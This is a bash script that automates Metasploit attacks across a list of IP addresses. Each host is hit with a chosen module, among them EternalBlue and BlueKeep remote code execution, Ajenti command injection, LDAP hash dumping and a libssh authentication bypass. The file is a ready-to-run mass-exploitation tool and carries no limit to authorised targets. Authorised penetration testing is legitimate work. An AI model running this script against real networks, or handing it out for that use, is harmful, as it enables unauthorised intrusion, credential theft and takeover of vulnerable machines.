#!/bin/bash

# Function to print usage information
usage() {
    echo "Usage: $0 -iL <ip_list_file> -ex <exploit_name> [-cip <target_ip>] [-cp <target_port>] [-o <output_file>] [-h]"
    echo "Options:"
    echo "  -iL <ip_list_file>     Path to the file containing the list of IP addresses"
    echo "  -ex <exploit_name>     Name of the exploit to use"
    echo "  -cip <target_ip>       IP address of the specific target (optional)"
    echo "  -cp <target_port>      Port of the specific target (optional)"
    echo "  -o <output_file>       Save output to a file (optional)"
    echo "  -h                     Display this help message"
    echo "Available Exploits:"
    echo "  smb             - exploit/windows/smb/ms17_010_eternalblue"
    echo "  rdp             - exploit/windows/rdp/cve_2019_0708_bluekeep_rce"
    echo "  ssdp_upnp       - auxiliary/scanner/upnp/ssdp_msearch"
    echo "  http_trace      - auxiliary/scanner/http/trace"
    echo "  netbios         - auxiliary/scanner/netbios/nbname"
    echo "  http_heartbleed - auxiliary/scanner/ssl/openssl_heartbleed"
    echo "  smtp            - auxiliary/scanner/smtp/smtp_relay"
    echo "  ftp_anonymous   - auxiliary/scanner/ftp/anonymous"
    echo "  libssh_auth_bypass  - auxiliary/scanner/ssh/libssh_auth_bypass"
    echo "  ldap_hashdump   - auxiliary/gather/ldap_hashdump"
    echo "  ajenti  - exploit/unix/webapp/ajenti_auth_username_cmd_injection"
    exit 1
}

# Initialize variables
target_ip=""
target_port=""
output=""

# Parse command-line arguments
while [[ $# -gt 0 ]]; do
    key="$1"
    case $key in
        -iL)
        ip_list_file="$2"
        shift
        shift
        ;;
        -ex)
        exploit_name="$2"
        shift
        shift
        ;;
        -cip)
        target_ip="$2"
        shift
        shift
        ;;
        -cp)
        target_port="$2"
        shift
        shift
        ;;
        -o)
        output="$2"
        shift
        shift
        ;;
        -h)
        usage
        ;;
        *)
        echo "Unknown option: $1"
        usage
        ;;
    esac
done

# Check if required arguments are provided
if [[ -z $ip_list_file || -z $exploit_name ]]; then
    usage
fi

# Function to exploit hosts using Metasploit with output option
exploit_hosts() {
    while IFS= read -r ip; do
        echo " "
        echo "--------------------------------------------------"
        echo " "
        echo "Exploiting host $ip with $exploit_name"
        if [[ "$ip" == "$target_ip" && -n "$target_port" ]]; then
            if [[ -n "$output" ]]; then
                msfconsole -q -x "use $exploit_name; set RHOSTS $ip; set RPORT $target_port; options; exploit; exit" < /dev/null >> "$output"
            else
                msfconsole -q -x "use $exploit_name; set RHOSTS $ip; set RPORT $target_port; options; exploit; exit" < /dev/null
            fi
        elif [[ -z "$target_ip" && -n "$target_port" ]]; then
            if [[ -n "$output" ]]; then
                msfconsole -q -x "use $exploit_name; set RHOSTS $ip; set RPORT $target_port; options; exploit; exit" < /dev/null >> "$output"
            else
                msfconsole -q -x "use $exploit_name; set RHOSTS $ip; set RPORT $target_port; options; exploit; exit" < /dev/null
            fi
        else
            if [[ -n "$output" ]]; then
                msfconsole -q -x "use $exploit_name; set RHOSTS $ip; options; exploit; exit" < /dev/null >> "$output"
            else
                msfconsole -q -x "use $exploit_name; set RHOSTS $ip; options; exploit; exit" < /dev/null
            fi
        fi
        # Append additional lines to the output file if output file is provided
        if [[ -n "$output" ]]; then
            echo " " >> "$output"
            echo "--------------------------- " >> "$output"
            echo " " >> "$output"
        fi
    done < "$ip_list_file"
}

# Execute the exploit based on the chosen exploit name
case $exploit_name in
    smb)
    exploit_name="exploit/windows/smb/ms17_010_eternalblue"
    exploit_hosts
    ;;
    rdp)
    exploit_name="exploit/windows/rdp/cve_2019_0708_bluekeep_rce"
    exploit_hosts
    ;;
    ssdp_upnp)
    exploit_name="auxiliary/scanner/upnp/ssdp_msearch"
    exploit_hosts
    ;;
    http_trace)
    exploit_name="auxiliary/scanner/http/trace"
    exploit_hosts
    ;;
    netbios)
    exploit_name="auxiliary/scanner/netbios/nbname"
    exploit_hosts
    ;;
    http_heartbleed)
    exploit_name="auxiliary/scanner/ssl/openssl_heartbleed"
    exploit_hosts
    ;;
    smtp)
    exploit_name="auxiliary/scanner/smtp/smtp_relay"
    exploit_hosts
    ;;
    ftp_anonymous)
    exploit_name="auxiliary/scanner/ftp/anonymous"
    exploit_hosts
    ;;
    libssh_auth_bypass)
    exploit_name="auxiliary/scanner/ssh/libssh_auth_bypass"
    exploit_hosts
    ;;
    ldap_hashdump)
    exploit_name="auxiliary/gather/ldap_hashdump"
    exploit_hosts
    ;;
    ajenti)
    exploit_name="exploit/unix/webapp/ajenti_auth_username_cmd_injection"
    exploit_hosts
    ;;

    *)
    echo "Unknown exploit: $exploit_name"
    usage
    ;;
esac
